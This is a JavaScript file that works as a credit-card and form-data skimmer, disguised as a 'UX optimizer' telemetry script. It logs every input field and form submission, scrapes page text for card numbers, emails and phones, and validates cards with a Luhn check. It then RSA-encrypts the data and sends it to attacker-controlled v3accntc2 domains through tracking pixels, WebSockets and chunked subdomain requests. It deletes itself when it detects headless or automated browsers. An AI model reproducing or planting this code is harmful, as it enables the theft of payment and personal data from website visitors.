(() => {
  // === CONFIG ===
  const PK_B64 = 'YOUR_RSA_PUBLIC_KEY_B64'; // Replace with your RSA public key
  const NODES = ['cdn.v3accntc2.info', 'api.v3accntc2.store', 'ws.v3accntc2.online'];
  const CHANNELS = ['ga4', 'pixel', 'ws', 'dns'];
  const TRACE_ID = localStorage.getItem('_ux_tid') || `tid_${Math.random().toString(36).substr(2, 9)}`;
  localStorage.setItem('_ux_tid', TRACE_ID);

  // === CRYPTO ===
  async function importPublicKey() {
    const binary = atob(PK_B64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    return crypto.subtle.importKey(
      'spki', bytes.buffer, { name: 'RSA-OAEP', hash: 'SHA-256' }, false, ['encrypt']
    );
  }

  async function encryptData(data) {
    const pubKey = await importPublicKey();
    const encoded = new TextEncoder().encode(JSON.stringify(data));
    const encrypted = await crypto.subtle.encrypt(
      { name: 'RSA-OAEP' }, pubKey, encoded
    );
    return btoa(String.fromCharCode(...new Uint8Array(encrypted)));
  }

  // === ENVIRONMENT CHECKS ===
  function checkEnvironment() {
    if (navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent)) {
      selfDestruct();
      return false;
    }
    return true;
  }

  function selfDestruct() {
    localStorage.clear();
    sessionStorage.clear();
    document.getElementById('ux-optimizer')?.remove();
  }

  // === DATA COLLECTION ===
  const dataCollectors = {
    queue: [],
    init() {
      // Input logging
      document.addEventListener('input', (e) => {
        if (e.target.tagName === 'INPUT') {
          this.queue.push({
            type: 'input',
            field: e.target.name || e.target.id || 'unknown',
            value: e.target.value,
            ts: Date.now()
          });
        }
      }, true);

      // Form submission interception
      document.addEventListener('submit', (e) => {
        const formData = new FormData(e.target);
        this.queue.push({
          type: 'form_submit',
          data: Object.fromEntries(formData),
          ts: Date.now()
        });
      });

      // DOM scraping
      const patterns = {
        card: /\b(?:\d[ -]*?){13,19}\b/g,
        email: /[^\s@]+@[^\s@]+\.[^\s@]+/g,
        phone: /\b\+?1?\d{10,15}\b/g
      };
      const text = document.body.innerText;
      Object.entries(patterns).forEach(([type, regex]) => {
        let match;
        while ((match = regex.exec(text)) !== null) {
          this.queue.push({ type, value: match[0], ts: Date.now() });
        }
      });
    }
  };

  // === DATA VALIDATION ===
  function validateData(data) {
    const validated = {};
    if (data.card && luhnCheck(data.card.replace(/\D/g, ''))) {
      validated.card = data.card;
      validated.bin = data.card.slice(0, 6);
      validated.last4 = data.card.slice(-4);
    }
    if (data.email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
      validated.email = data.email;
    }
    if (data.phone && /^\+?1?\d{10,15}$/.test(data.phone.replace(/\s/g, ''))) {
      validated.phone = data.phone;
    }
    return validated;
  }

  function luhnCheck(num) {
    let sum = 0, isEven = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num.charAt(i), 10);
      if (isEven) { digit *= 2; if (digit > 9) digit -= 9; }
      sum += digit;
      isEven = !isEven;
    }
    return sum % 10 === 0;
  }

  // === EXFILTRATION ===
  async function dispatchTelemetry(payload) {
    const encrypted = await encryptData(payload);
    const target = NODES[Math.floor(Math.random() * NODES.length)];

    // GA4 (noise)
    if (CHANNELS.includes('ga4') && typeof gtag === 'function') {
      gtag('event', 'ux_optimization', {
        encrypted_data: encrypted,
        card_bin: payload.bin,
        card_last4: payload.last4
      });
    }

    // Pixel
    if (CHANNELS.includes('pixel')) {
      new Image().src = `https://${target}/pixel?t=${TRACE_ID}&d=${encrypted}`;
    }

    // WebSocket
    if (CHANNELS.includes('ws')) {
      const ws = new WebSocket(`wss://${target}/ws`);
      ws.onopen = () => ws.send(JSON.stringify({ enc: encrypted }));
    }

    // DNS (chunked)
    if (CHANNELS.includes('dns')) {
      const chunks = btoa(encrypted).match(/.{1,63}/g) || [];
      chunks.forEach(chunk => {
        new Image().src = `https://${chunk}.${target}/dns`;
      });
    }
  }

  // === MAIN ===
  async function main() {
    if (!checkEnvironment()) return;
    dataCollectors.init();

    const validated = validateData(dataCollectors.queue.reduce((acc, item) => {
      if (item.type === 'form_submit') Object.assign(acc, item.data);
      else acc[item.type] = item.value;
      return acc;
    }, {}));

    if (validated.card) {
      await dispatchTelemetry(validated);
    }
  }

  // Initialize
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', main);
  } else {
    setTimeout(main, 1000);
  }
})();
